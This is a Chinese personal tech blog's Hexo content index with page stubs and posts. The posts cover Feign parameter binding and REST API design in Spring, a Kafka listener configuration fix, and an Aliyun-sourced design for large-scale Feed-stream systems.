{"meta":{"title":"MysticalYcc","subtitle":"执笔画惆怅丶","description":"一颗白菜的自我救赎！","author":"MysticalYcc","url":"https://gschaos.club","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-09-02T10:01:57.281Z","updated":"2020-09-02T10:01:57.281Z","comments":true,"path":"404.html","permalink":"https://gschaos.club/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"关于","date":"2020-09-16T01:35:41.590Z","updated":"2020-09-16T01:35:41.000Z","comments":true,"path":"about/index.html","permalink":"https://gschaos.club/about/index.html","excerpt":"","text":"关于我一直在前进的小菜鸟，欢迎联系我。 From Ycc QQ: 568166723Email: &#53;&#54;&#x38;&#x31;&#x36;&#x36;&#55;&#50;&#51;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#x6d;Phone: 15155137510"},{"title":"gallery","date":"2020-09-18T08:21:26.000Z","updated":"2020-09-23T09:00:09.000Z","comments":true,"path":"gallery/index.html","permalink":"https://gschaos.club/gallery/index.html","excerpt":"","text":""},{"title":"分类","date":"2019-08-14T16:00:00.000Z","updated":"2020-09-18T08:37:22.000Z","comments":true,"path":"categories/index.html","permalink":"https://gschaos.club/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-09-07T14:17:49.000Z","updated":"2020-09-16T01:34:05.000Z","comments":true,"path":"link/index.html","permalink":"https://gschaos.club/link/index.html","excerpt":"","text":""},{"title":"","date":"2020-09-02T10:01:57.301Z","updated":"2020-09-02T10:01:57.301Z","comments":true,"path":"mylist/index.html","permalink":"https://gschaos.club/mylist/index.html","excerpt":"","text":""},{"title":"project","date":"2019-10-29T09:49:09.000Z","updated":"2020-09-02T10:01:57.301Z","comments":true,"path":"project/index.html","permalink":"https://gschaos.club/project/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-09-04T16:00:00.000Z","updated":"2020-09-16T02:22:09.000Z","comments":true,"path":"tags/index.html","permalink":"https://gschaos.club/tags/index.html","excerpt":"","text":""},{"title":"friden","date":"2019-10-29T09:52:33.000Z","updated":"2020-09-02T10:01:57.281Z","comments":true,"path":"friden/index.html","permalink":"https://gschaos.club/friden/index.html","excerpt":"","text":""},{"title":"","date":"2020-09-10T06:58:41.928Z","updated":"2020-09-10T06:58:28.000Z","comments":true,"path":"friends/index.html","permalink":"https://gschaos.club/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"Feign的请求参数绑定机制","slug":"Feign","date":"2020-11-11T16:00:00.000Z","updated":"2020-11-12T09:32:36.000Z","comments":true,"path":"Feign/","link":"","permalink":"https://gschaos.club/Feign/","excerpt":"","text":"从 Feign 使用注意点到 RESTFUL 接口设计规范场景：在gateway拦截请求获取token调用认证服务认证token正确性。 在auth-service服务端提供验证token的服务接口，它是这个样子的 1234567891011121314151617@RestController@RequestMapping(&quot;auth&quot;)public class AuthController &#123; @RequestMapping(value = &quot;/info&quot;, method = RequestMethod.GET) public CommonResponse&lt;String&gt; auth(String token)&#123; System.out.println(token); String s = JwtTokenUtil.parseToken(token); System.out.println(s); if(&quot;ycc&quot;.equals(s))&#123; return new CommonResponse&lt;&gt;(CommonResultEnum.SUCCESS); &#125; return new CommonResponse&lt;&gt;(CommonResultEnum.FAILED_INSUFFICIENT_AUTHORITY); &#125;&#125; 这个接口写起来非常简单，但实际 springmvc 做了非常多的兼容，使得这个接口可以接受多种请求方式。 RequestMapping 代表映射的路径，使用 GET,POST,PUT,DELETE 方式都可以映射到该端点。 SpringMVC 中常用的请求参数注解有（@RequestParam,@RequestBody,@PathVariable）等。token 被默认当做 @RequestParam。形参 String token 由框架使用字节码技术获取 token 这个名称，自动检测请求参数中 key 值为 token 的参数，也可以使用 @RequestParam(“token”) 覆盖变量本身的名称。当我们在 url 中携带 token 参数或者 form 表单中携带 token 参数时，会被获取到。 12345POST /hello HTTP/1.1Host: localhost:8987Content-Type: application/x-www-form-urlencodedtoken=xxxxxxxxxxx 或 12GET /auth/info?token=xxxxxx HTTP/1.1Host: localhost:8987 在gateway的一端需要拿到token进行Feign调用auth服务，它是这个样子的 AuthService 123456@FeignClient(name = &quot;auth-service&quot;)public interface AuthService &#123; @RequestMapping(value = &quot;/auth/info&quot;, method = RequestMethod.GET) CommonResponse&lt;String&gt; getAuthInfo(String token);&#125; TokenFilter调用处 123456789log.info(&quot;authenticate token start...&quot;); if(token.contains(&quot;Bearer&quot;))&#123; token = token.substring(token.indexOf(&quot;Bearer &quot;)+7); &#125; CommonResponse&lt;String&gt; authInfo = authService.getAuthInfo(token); if (!&quot;200&quot;.equals(authInfo.getCode())) &#123; exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); &#125; 一切看上去都那么对称美好，没有瑕疵。 我们按照写 SpringMVC 的 RestController 的习惯写了一个 FeignClient，按照我们的一开始的想法，由于指定了请求方式是 GET，那么 token应该会作为 QueryString 拼接到 Url 中吧？发出一个这样的 GET 请求： 12GET /auth/info?token=xxx HTTP/1.1Host: localhost:8987 当我们启动项目开始调用的时候， gateway调用处断点 出现的结果是： 并没有按照期望使用 GET 方式发送请求，而是 POST 方式. 既然这样，那我们就让auth-service支持POST请求； 再来调用一次； gateway调用处断点 出现的结果是： 这个时候显示成功了，那么现在去auth-service查看结果； 看了个寂寞，参数并未接收到。 Feign 的请求参数绑定机制查看文档发现，如果不加默认的注解，Feign 则会对参数默认加上 @RequestBody 注解，而 RequestBody 一定是包含在请求体中的，GET 方式无法包含。所以上述两个现象得到了解释。Feign 在 GET 请求包含 RequestBody 时强制转成了 POST 请求，而不是报错。 理解清楚了这个机制我们就可以在开发 Feign 接口避免很多坑。而解决上述这个问题也很简单 在 Feign 接口中为 token添加 @RequestParam(“token”) 注解，token必须指定，Feign 的请求参数不会利用 SpringMVC 字节码的机制自动给定一个默认的名称。 由于 Feign 默认使用 @RequestBody，也可以改造 RestController，使用 @RequestBody 接收。但是，请求参数通常是多个，推荐使用上述的 @RequestParam，而 @RequestBody 一般只用于传递对象。 Feign 绑定复合参数指定请求参数的类型与请求方式，上述问题的出现实际上是由于在没有理清楚 Feign 内部机制的前提下想当然的和 SpringMVC 进行了类比。同样，在使用对象作为参数时，也需要注意这样的问题。 对于这样的接口 1234567891011121314151617@FeignClient(&quot;book&quot;)public interface BookApi &#123; @RequestMapping(value = &quot;/book&quot;,method = RequestMethod.POST) Book book(@RequestBody Book book); // &lt;1&gt; @RequestMapping(value = &quot;/book&quot;,method = RequestMethod.POST) Book book(@RequestParam(&quot;id&quot;) String id,@RequestParam(&quot;name&quot;) String name); // &lt;2&gt; @RequestMapping(value = &quot;/book&quot;,method = RequestMethod.POST) Book book(@RequestParam Map map); // &lt;3&gt; // 错误的写法 @RequestMapping(value = &quot;/book&quot;,method = RequestMethod.POST) Book book(@RequestParam Book book); // &lt;4&gt;&#125; 使用 @RequestBody 传递对象是最常用的方式。 如果参数并不是很多，可以平铺开使用 @RequestParam 使用 Map，这也是完全可以的，但不太符合面向对象的思想，不能从代码立刻看出该接口需要什么样的参数。 错误的用法，Feign 没有提供这样的机制自动转换实体为 Map。 按照这个说法修改我们的接口和FeignClient AuthController 1234567891011121314151617@RestController@RequestMapping(&quot;auth&quot;)public class AuthController &#123; @RequestMapping(value = &quot;/info&quot;, method = RequestMethod.GET) public CommonResponse&lt;String&gt; auth(String token)&#123; System.out.println(token); String s = JwtTokenUtil.parseToken(token); System.out.println(s); if(&quot;ycc&quot;.equals(s))&#123; return new CommonResponse&lt;&gt;(CommonResultEnum.SUCCESS); &#125; return new CommonResponse&lt;&gt;(CommonResultEnum.FAILED_INSUFFICIENT_AUTHORITY); &#125;&#125; AuthService 123456@FeignClient(name = &quot;auth-service&quot;)public interface AuthService &#123; @RequestMapping(value = &quot;/auth/info&quot;, method = RequestMethod.GET) CommonResponse&lt;String&gt; getAuthInfo(@RequestParam(&quot;token&quot;) String token);&#125; 再次调试： 调用成功…… Feign 中使用 @PathVariable 与 RESTFUL 规范这涉及到一个如何设计 RESTFUL 接口的话题，我们知道在自从 RESTFUL 在 2000 年初被提出来之后，就不乏文章提到资源，契约规范，CRUD 对应增删改查操作等等。下面笔者从两个实际的接口来聊聊自己的看法。 根据 id 查找用户接口： 1234567@FeignClient(&quot;user&quot;)public interface UserApi &#123; @RequestMapping(value = &quot;/user/&#123;userId&#125;&quot;,method = RequestMethod.GET) String findById(@PathVariable(&quot;id&quot;) String userId);&#125; 这应该是没有争议的，注意前面强调的，@PathVariable(“id”) 括号中的 id 不可以忘记。那如果是“根据邮箱查找用户呢”? 很有可能下意识的写出这样的接口： 1234567@FeignClient(&quot;user&quot;)public interface UserApi &#123; @RequestMapping(value = &quot;/user/&#123;email&#125;&quot;,method = RequestMethod.GET) String findByEmail(@PathVariable(&quot;email&quot;) String email);&#125; 首先看看 Feign 的问题。email 中通常包含’.‘这个特殊字符，如果在路径中包含，会出现意想不到的结果。我不想探讨如何去解决它（实际上可以使用 {email:.+} 的方式), 因为我觉得这不符合设计。 再谈谈规范的问题。这两个接口是否是相似的，email 是否应该被放到 path 中？这就要聊到 RESTFUL 的初衷，为什么 userId 这个属性被普遍认为适合出现在 RESTFUL 路径中，因为 id 本身起到了资源定位的作用，他是资源的标记。而 email 不同，它可能是唯一的，但更多的，它是资源的属性，所以，笔者认为不应该在路径中出现非定位性的动态参数。而是把 email 作为 @RequestParam 参数。 RESUFTL 结构化查询笔者成功的从 Feign 的话题过度到了 RESTFUL 接口的设计问题，也导致了本文的篇幅变长了，不过也不打算再开一片文章谈了。 再考虑一个接口设计，查询某一个月某个用户的订单，可能还会携带分页参数，这时候参数变得很多，按照传统的设计，这应该是一个查询操作，也就是与 GET 请求对应，那是不是意味着应当将这些参数拼接到 url 后呢？再思考 Feign，正如本文的第二段所述，是不支持 GET 请求携带实体类的，这让我们设计陷入了两难的境地。而实际上参考一些 DSL 语言的设计如 elasticSearch，也是使用 POST JSON 的方式来进行查询的，所以在实际项目中，笔者并不是特别青睐 CRUD 与四种请求方式对应的这种所谓的 RESTFUL 规范，如果说设计 RESTFUL 应该遵循什么规范，那大概是另一些名词，如契约规范和领域驱动设计。 1234567@FeignClient(&quot;order&quot;)public interface BookApi &#123; @RequestMapping(value = &quot;/order/history&quot;,method = RequestMethod.POST) Page&lt;List&lt;Orders&gt;&gt; queryOrderHistory(@RequestBody QueryVO queryVO);&#125; RESTFUL 行为限定在实际接口设计中，我遇到了这样的需求，用户模块的接口需要支持修改用户密码，修改用户邮箱，修改用户姓名，而笔者之前阅读过一篇文章，也是讲舍弃 CRUD 而是用领域驱动设计来规范 RESTFUL 接口的定义，与项目中我的想法不谋而合。看似这三个属性是同一个实体类的三个属性，完全可以如下设计： 1234567@FeignClient(&quot;user&quot;)public interface UserApi &#123; @RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST) User update(@RequestBody User user);&#125; 但实际上，如果再考虑多一层，就应该产生这样的思考：这三个功能所需要的权限一致吗？真的应该将他们放到一个接口中吗？实际上，笔者并不希望接口调用方传递一个实体，因为这样的行为是不可控的，完全不知道它到底是修改了什么属性，如果真的要限制行为，还需要在 User 中添加一个操作类型的字段，然后在接口实现方加以校验，这太麻烦了。而实际上，笔者觉得规范的设计应当如下： 12345678910111213@FeignClient(&quot;user&quot;)public interface UserApi &#123; @RequestMapping(value = &quot;/user/&#123;userId&#125;/password/update&quot;,method = RequestMethod.POST) ResultBean&lt;Boolean&gt; updatePassword(@PathVariable(&quot;userId) String userId,@RequestParam(&quot;password&quot;) password); @RequestMapping(value = &quot;/user/&#123;userId&#125;/email/update&quot;,method = RequestMethod.POST) ResultBean&lt;Boolean&gt; updateEmail(@PathVariable(&quot;userId) String userId,@RequestParam(&quot;email&quot;) String email); @RequestMapping(value = &quot;/user/&#123;userId&#125;/username/update&quot;,method = RequestMethod.POST) ResultBean&lt;Boolean&gt; updateUsername(@PathVariable(&quot;userId) String userId,@RequestParam(&quot;username&quot;) String username);&#125; 一般意义上 RESTFUL 接口不应该出现动词，这里的 update 并不是一个动作，而是标记着操作的类型，因为针对某个属性可能出现的操作类型可能会有很多，所以我习惯加上一个 update 后缀，明确表达想要进行的操作，而不是仅仅依赖于 GET，POST，PUT，DELETE。实际上，修改操作推荐使用的请求方式应当是 PUT，这点笔者的理解是，已经使用 update 标记了行为，实际开发中不习惯使用 PUT。 password，email，username 都是 user 的属性，而 userId 是 user 的识别符号，所以 userId 以 PathVariable 的形式出现在 url 中，而三个属性出现在 ReqeustParam 中。 顺带谈谈逻辑删除，如果一个需求是删除用户的常用地址，这个 api 的操作类型，我通常也不会设计为 DELETE 请求，而是同样使用 delete 来标记操作行为 12@RequestMapping(value &#x3D; &quot;&#x2F;user&#x2F;&#123;userId&#125;&#x2F;address&#x2F;&#123;addressId&#125;&#x2F;delete&quot;,method &#x3D; RequestMethod.POST) ResultBean&lt;Boolean&gt; updateEmail(@PathVariable(&quot;userId&quot;) String userId,@PathVariable(&quot;userId&quot;) String email); 参考 徐靖峰/阿里巴巴中间件研发","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"kafka配置注意点","slug":"kafka配置注意点","date":"2020-11-01T16:00:00.000Z","updated":"2020-11-02T13:41:56.000Z","comments":true,"path":"kafka配置注意点/","link":"","permalink":"https://gschaos.club/kafka%E9%85%8D%E7%BD%AE%E6%B3%A8%E6%84%8F%E7%82%B9/","excerpt":"","text":"kafka无法启动,Cannot assign requested address. Cannot assign requested address.搭建kafka时，需要对配置文件进行修改，在服务器上搭建时候，配置文件中需要配置 ：listeners：advertised.host.name：advertised.listeners 这几项，其中 listeners 配置的ip和其他两者相同时启动kafka会报这样的错误：Cannot assign requested address。这个错误的原因是基于OpenStack的机器的情况下的虚拟机对外ip[暴露的ip]和真实ip[ifconfig显示的ip]可能只是映射关系，用户访问对外ip时，OpenStack会转发到对应的真实ip实现访问。但此时如果 Kafka server.properties配置中的listeners=PLAINTEXT://对外IP:9092中的ip配置为[对外ip]的时候无法启动，因为socket无法绑定监听； 解决查看内网IP地址：ifconfig修改配置文件： 1234listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;内网:9092 advertised.host.name&#x3D;外网ip或者域名advertised.listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;外网ip或者域名:9092 123 重新启动： 启动成功。。。","categories":[{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/categories/kafka/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/tags/kafka/"}]},{"title":"Feed流系统","slug":"Feed流系统","date":"2020-11-01T16:00:00.000Z","updated":"2020-11-03T00:42:28.000Z","comments":true,"path":"Feed流系统/","link":"","permalink":"https://gschaos.club/Feed%E6%B5%81%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"如何打造千万级Feed流系统Feed流是一个目前非常常见的功能，在众多产品中都有展现，比如微博，朋友圈，消息广场，通知，IM等。通过Feed流可以把动态实时的传播给订阅者，是用户获取信息流的一种有效方式。在大数据时代，如何打造一个千万级规模的Feed流系统仍然是一个挑战。本文中会介绍如何设计一个千万量级的Feed流系统的架构。 作者：少强 链接：https://developer.aliyun.com/article/224132 在互联网领域，尤其现在的移动互联网时代，Feed流产品是非常常见的，比如我们每天都会用到的朋友圈，微博，就是一种非常典型的Feed流产品，还有图片分享网站Pinterest，花瓣网等又是另一种形式的Feed流产品。除此之外，很多App的都会有一个模块，要么叫动态，要么叫消息广场，这些也是Feed流产品，可以说，Feed流产品是遍布天下所有的App中。 概念我们在讲如何设计Feed流系统之前，先来看一下Feed流中的一些概念： Feed：Feed流中的每一条状态或者消息都是Feed，比如朋友圈中的一个状态就是一个Feed，微博中的一条微博就是一个Feed。 Feed流：持续更新并呈现给用户内容的信息流。每个人的朋友圈，微博关注页等等都是一个Feed流。 Timeline：Timeline其实是一种Feed流的类型，微博，朋友圈都是Timeline类型的Feed流，但是由于Timeline类型出现最早，使用最广泛，最为人熟知，有时候也用Timeline来表示Feed流。 关注页Timeline：展示其他人Feed消息的页面，比如朋友圈，微博的首页等。 个人页Timeline：展示自己发送过的Feed消息的页面，比如微信中的相册，微博的个人页等。 特征Feed流系统有一些非常典型的特点，比如： 多账号内容流：Feed流系统中肯定会存在成千上万的账号，账号之间可以关注，取关，加好友和拉黑等操作。只要满足这一条，那么就可以当做Feed流系统来设计。 非稳定的账号关系：由于存在关注，取关等操作，所以系统中的用户之间的关系就会一直在变化，是一种非稳定的状态。 读写比例100:1：读写严重不平衡，读多写少，一般读写比例在10：1，甚至100：1以上。 消息必达性要求高：比如发送了一条朋友圈后，结果部分朋友看到了，部分朋友没看到，如果偏偏女朋友没看到，那么可能会产生很严重的感情矛盾，后果很严重。 上面的就是Feed流产品的一些特点，下面我们来看一下Feed流系统的分类。 分类Feed流的分类有很多种，但最常见的分类有两种： Timeline：按发布的时间顺序排序，先发布的先看到，后发布的排列在最顶端，类似于微信朋友圈，微博等。这也是一种最常见的形式。产品如果选择Timeline类型，那么就是认为Feed流中的Feed不多，但是每个Feed都很重要，都需要用户看到。 Rank：按某个非时间的因子排序，一般是按照用户的喜好度排序，用户最喜欢的排在最前面，次喜欢的排在后面。这种一般假定用户可能看到的Feed非常多，而用户花费在这里的时间有限，那么就为用户选择出用户最想看的Top N结果，场景的应用场景有图片分享、新闻推荐类、商品推荐等。 上面两种是最典型，也是最常见的分类方式，另外的话，也有其他的分类标准，在其他的分类标准中的话，会多出两种类型： Aggregate：聚合类型，比如好几个朋友都看了同一场电影，这个就可以聚合为一条Feed：A，B，C看了电影《你的名字》，这种聚合功能比较适合在客户端做。一般的Aggregate类型是Timeline类型 + 客户端聚合。 Notice：通知类型，这种其实已经是功能类型了，通知类型一般用于APP中的各种通知，私信等常见。这种也是Timeline类型，或者是Aggregate类型。 实现上面介绍了Feed流系统的概念，特征以及分类，接下来开始进入关键部分：如何实现一个千万级Feed流系统。由于系统中的所有用户不可能全部在线，且不可能同时刷新和发布Feed，那么一个能支撑千万量级Feed流的系统，其实在产品上可以支撑上亿的用户。 如果要设计一个Feed流系统，最关键的两个核心，一个是存储，一个是推送。 存储我们先来看存储，Feed流系统中需要存储的内容分为两部分，一个是账号关系（比如关注列表），一种是Feed消息内容。不管是存储哪一种，都有几个问题需要考虑： 如何能支持100TB，甚至PB级数据量？ 数据量大了后成本就很关键，成本如何能更便宜？ 如何保证账号关系和Feed不丢失？ 我们后面再解答这三个问题，先继续看推送 推送推送系统需要的功能有两个，一个是发布Feed，一个是读取Feed流。对于提送系统，仍然有一些问题需要在选型之前考虑： 如何才能提供千万的TPS和QPS？ 如何保证读写延迟在10ms，甚至2ms以下？ 如何保证Feed的必达性？ 再解答这些问题之前，我们先来大概了解下阿里云的表格存储TableStore。 TableStore表格存储(TableStore)是阿里云自主研发的专业级分布式NoSQL数据库，是基于共享存储的高性能、低成本、易扩展、全托管的半结构化数据存储平台，支撑互联网和物联网数据的高效计算与分析。 目前不管是阿里巴巴集团内部，还是外部公有云用户，都有成千上万的系统在使用。覆盖了重吞吐的离线应用，以及重稳定性，性能敏感的在线应用。目前使用的系统中，有些系统每秒写入行数超过3500万行，每秒流量超过5GB，单表总行数超过10万亿行，单表数据量超过10PB。 表格存储的具体的特性可以看下面这张图片。 这里就不详细介绍表格存储(TableStore)的功能和特性了，有兴趣的话可以到官网页面和云栖博客了解，地址如下： 表格存储的官网地址：https://www.aliyun.com/product/ots/ 表格存储云栖博客：https://yq.aliyun.com/teams/4/type_blog-cid_22 表格存储钉钉交流群：11789671 存储系统选择我们接下来解决之前提出来的问题。Feed流系统中需要存储的系统有两类，一类是账号关系（比如关注列表），一类是Feed消息。 存储账号关系我们先来看账号关系（比如关注列表）的存储，对于账号关系，它有一些特点： 是一系列的变长链表，长度可达亿级别。 这样就会导致数据量比较大，但是关系极其简单。 还有一点是性能敏感，直接影响关注，取关的响应速度。 最适合存账号关系（关注列表）的系统应该是分布式NoSQL数据库，原因是数据量极大，关系简单不需要复杂的join，性能要求高。对内设计实现简单，对外用户体验好。 除了上面这些特点外，还有一个特点： 有序性：有序性并不要求具有排序功能，只需要能按照主键排序就行，只要能按照主键排序，那么关注列表和粉丝列表的顺序就是固定的，可预期的。 使用开源HBase存储账号关系能满足有序性的分布式NoSQL数据库中，开源HBase就是一个，所以很多企业会选择开源HBase来存储账号关系，或者是关注列表。 这样虽然满足了上述四个特征，可以把系统搭建起来，但是会有一些麻烦的问题： 需要自己运维，调查问题，Fix bug，会带来较大的复杂度和成本开支。 GC会导致比较大的毛刺，影响用户体验， 使用表格存储(TableStore)存储账号关系除此之外，阿里云的表格存储也属于有序性的分布式NoSQL数据库，之前有不少很有名的系统选择使用表格存储，在下面一些地方给系统带来了收益： 单表支持10万亿行+，10PB+的数据量，再快的数据增长速度都不用担心。 数据按主键列排序，保证有序性和可预期性。 单key读写延迟在毫秒级别，保证关注，取关的响应时间。 是全托管的分布式NoSQL数据库服务，无需任何运维。 全部采用C++ 实现，彻底无GC问题，也就不会由于GC而导致较大的毛刺。 使用表格存储(TableStore)来存储账号关系会是一个比较好的选择。 接下来看一下Feed消息的存储。 存储Feed消息Feed消息有一个最大的特点： 数据量大，而且在Feed流系统里面很多时候都会选择写扩散（推模式）模式，这时候数据量会再膨胀几个数量级，所以这里的数据量很容易达到100TB，甚至PB级别。 除此之外，还有一些其他特点： 数据格式简单 数据不能丢失，可靠性要求高 自增主键功能，保证个人发的Feed的消息ID在个人发件箱中都是严格递增的，这样读取时只需要一个范围读取即可。由于个人发布的Feed并发度很低，这里用时间戳也能满足基本需求，但是当应用层队列堵塞，网络延迟变大或时间回退时，用时间戳还是无法保证严格递增。这里最好是有自增功能。 成本越低越好 潜在的存储系统根据上述这些特征，最佳的系统应该是具有主键自增功能的分布式NoSQL数据库，但是在开源系统里面没有，所以常用的做法有两种： 关系型数据库 + 分库分表 关系型数据库 + 分布式NoSQL数据库：其中 关系型数据库提供主键自增功能。 使用关系型数据库存储Feed消息目前业界有很多用户选择了关系系数据库+ 分库分表，包括了一些非常著名的Feed流产品，虽然这个架构可以运行起来，但是存在一些问题。 分库分表带来了运维复杂性。 分库分表带来了逻辑层和数据层的极大耦合性。 关系型数据库，比如开源MySQL数据库的主键自增功能性能差。不管是用MyISAM，还是InnoDB引擎，要保证自增ID严格递增，必须使用表锁，这个粒度非常大，会严重限制并发度，影响性能。 有些用户觉得关系型数据库的可靠性高一些，但是关系型数据库的可靠性一般也就最多6个9，这个可靠性和分布式数据库完全不在一个层级，要低4到5个级别。 使用TableStore存储账号关系基于上述原因，一些技术公司开始考虑使用表格存储(TableStore)，表格存储是一个具有自增主键功能的分布式NoSQL数据库，这样就只需要使用一种系统，除此之外还有以下的考虑： 单表可达10PB，10万亿行。 10个9的SLA保障Feed内容不丢失。 天然分布式数据库，无需分库分表 两种实例类型：高性能实例采用全SSD存储媒介，提供极佳的读写性能。混合存储实例采用SSD+SATA存储媒介，提供极低的存储成本。 主键自增功能性能极佳，其他所有系统在做自增功能的时候都需要加锁，但是表格存储的主键自增功能在写入自增列行的时候，完全不需要锁，既不需要表锁，也不需要行锁。 从上面看，使用TableStore的话，不管是在功能，性能，扩展性还是成本方面都要更加适合一些。 看完推送系统选择后，我们再来看看推送方案的选择。 推送方案我们先来回顾下之前说的Feed流系统最大的特点： 读写严重不平衡，读多写少，一般读写比例都在10；1，甚至100：1之上。 除此之外，还有一个方面会被推送方案影响： 发布， 刷新Feed时的延时本质上由推送方案决定，其他的任何操作都只能是优化，质量量变，无法质变。 推模式和拉模式对比在推送方案里面的，有两种方案，分别是： 拉方案：也称为读扩散。 推方案：也成为写扩散。 对于拉方案和推方案，他们在很多方面完全相反，在看对比之前有一点要强调下： 对Feed流产品的用户而言，刷新Feed流（读取）时候的延迟敏感度要远远大于发布（写入）的时候。 拉模式(读扩散) 推模式(写扩散) 发布 个人页Timeline（发件箱） 粉丝的关注页（收件箱） 阅读 所有关注者的个人页Timeline 自己的关注页Timeline 网络最大开销 用户刷新时 发布Feed时 读写放大 放大读：读写比例到1万:1 放大写减少读：读写比例到50:50 个性化 不支持 支持 定向广告 不支持 支持 推模式的一个副作用在上面的对比中可以明显看出来，推模式要远远比拉模式更好一些，但是也有一个副作用： 数据会极大膨胀。 针对这个缺点，可以从两个方面考虑： 目前的存储价格很低很低了，就以表格存储为例，容量型实例存储10TB的数据量，在现在（2017年10月）每年费用是1万六千元，以后价格会随着硬件技术升级，软件性能优化等继续降低。还有数据量越大价格越便宜。 想省点钱，那继续可以优化： 对大V采用拉模式，普通用户使用推模式，这种模式有个缺点，后面会有分析。 对活跃粉丝采用推模式，非活跃粉丝采用拉模式（这种方式可以较好的避免大流量对平台的冲击） 适用场景通过上述两个方案的对比后，总结下各个方案的适用场景： 拉模式： 很多Feed流产品的第一版会采用这种方案，但很快就会抛弃。 另外，拉模式 + 图计算 就会是另一番天地，但是这个时候重心就是图计算了。 推模式： Feed流系统中最常用、有效的模式； 用户关系数比较均匀，或者有上限，比如朋友圈； 偏推荐类，同一个Feed对不同用户价值不同，需要为不同用户计算分数，比如pinterest。 推拉结合 大部分用户的账号关系都是几百个，但是有个别用户是1000万以上，比如微博。 上面了解了推送方案，接下来看下推送系统选择 推送系统如果要实现一个千万量级的Feed流产品，那么推送系统需要具备一些特点： 具备千万TPS/QPS的能力。 读写链路延迟敏感，读写直接会影响用户发布，刷新Feed流时的延迟，尤其是极其敏感的刷新时的延迟。 Feed消息的必达性要求很高。 主键自增功能，仍然是保证用户收件箱中的Feed ID是严格递增的，保证可以通过Scan(上次读取的最大ID —&gt;MAX)读取到最新未读消息。 最好能为用户存储Timeline中所有的Feed。 从上述特点来看，需要的推送系统最好是一个性能极佳，又可靠的有自增功能的NoSQL系统，所以，业内一般如果选择开源系统的话，会在选择了关系型数据库作为存储系统的基础上，选择开源Redis，这样就能覆盖上述的几个特征，也能保证Feed流系统正常运行起来，但是也会带来一些其他问题： 纯内存系统，内存价格极高，整体成本就比较高了。 属于单机系统，为了支持千万TPS和保证消息必达性，需要使用cluster和replica模式，结果就是不仅带来了运维的复杂性，而且带来了成本的机器增加，成本再次上升。 成本上升了以后，就有架构师开始考虑是否可以节省一些成本，要节省成本只能是减少开源Redis里面存储的数据量，一般有两种做法，这两种做法都能减少存入Redis中的数据量： 只在开源Redis中存储Feed ID，不存储Feed内容。整体数据量会大量减少，但是在读取的时候需要先读Feed ID，然后在到存储系统里面去读取Feed内容，网络开销增长了一倍，而且是串行的，对用户的刷新延迟有较大影响。 只对普通用户或者活跃用户使用推模式，对大V和非活跃用户直接使用拉模式。 上述两个方案虽然可以节省成本，但是是以牺牲用户体验为代价的，最终需要在成本和用户体验之间权衡。 使用TableStore作为推送系统除了使用开源系统外，还可以使用阿里云的表格存储（TableStore），有不少用户选择TableStore作为推送系统的原因无非下面几点： 天然分布式，单表可支持千万级TPS/QPS。 LSM存储引擎极大优化写，高性能实例极大优化读。 写入成功即保证落盘成功，数据可靠性提供10个9的SLA保障。 磁盘性数据库，费用比内存性的要低几个量级。 单表可存储十万亿行以上的数据，价格又低，轻松保存用户Feed流中的所有Feed数据。 上面说了使用开源Redis和阿里云TableStore的异同，如果使用开源可以用Redis，如果选择阿里云自研NoSQL数据库，可以使用TableStore。 架构图下面我们来看一下使用TableStore的架构图，这里为了通用性，选用推拉结合的方式，推模式更加简单。 存储我们先来看中间黑色框中的部分，这部分是使用TableStore的数据，从左往右分别是： 个人页Timeline：这个是每个用户的发件箱，也就是自己的个人页页面。 关注页Timeline：这个是每个用户的收件箱，也就是自己的关注页页面，内容都是自己关注人发布的消息。 关注列表：保存账号关系，比如朋友圈中的好友关系；微博中的关注列表等。 虚拟关注列表：这个主要用来个性化和广告。 发布Feed流程当你发布一条Feed消息的时候，流程是这样的： Feed消息先进入一个队列服务。 先从关注列表中读取到自己的粉丝列表，以及判断自己是否是大V。 将自己的Feed消息写入个人页Timeline（发件箱）。如果是大V，写入流程到此就结束了。 如果是普通用户，还需要将自己的Feed消息写给自己的粉丝，如果有100个粉丝，那么就要写给100个用户，包括Feed内容和Feed ID。 第三步和第四步可以合并在一起，使用BatchWriteRow接口一次性将多行数据写入TableStore。 发布Feed的流程到此结束。 读取Feed流流程当刷新自己的Feed流的时候，流程是这样的： 先去读取自己关注的大V列表 去读取自己的收件箱，只需要一个GetRange读取一个范围即可，范围起始位置是上次读取到的最新Feed的ID，结束位置可以使当前时间，也可以是MAX，建议是MAX值。由于之前使用了主键自增功能，所以这里可以使用GetRange读取。 如果有关注的大V，则再次并发读取每一个大V的发件箱，如果关注了10个大V，那么则需要10次访问。 合并2和3步的结果，然后按时间排序，返回给用户。 至此，使用推拉结合方式的发布，读取Feed流的流程都结束了。 更简单的推模式如果只是用推模式了，则会更加简单： 发布Feed： 不用区分是否大V，所有用户的流程都一样，都是三步。 读取Feed流： 不需要第一步，也不需要第三步，只需要第二步即可，将之前的2 + N(N是关注的大V个数) 次网络开销减少为 1 次网络开销。读取延时大幅降级。 个性化和定向广告个性化和定向广告是两种很强烈的产品需求。个性化可以服务好用户，增大产品竞争力和用户粘性，而定向广告可以为产品增加盈利渠道，而且还可以不招来用户反感，那么这两种方式如何实现呢？ 在Feeds流里面这两种功能的实现方式差不多，我们以定向广告为例来说明： 通过用户特征分析对用户分类，比如其中有一类是新生类：今年刚上大学的新生。（具体的用户特征分析可以依靠TableStore + MaxCompute，这里就不说了）。 创建一个广告账号：新生广告 让这些具有新生特征的用户虚拟关注新生广告账号。用户看不到这一层关注关系。 从七月份开始就可以通过新生广告账号发送广告了。 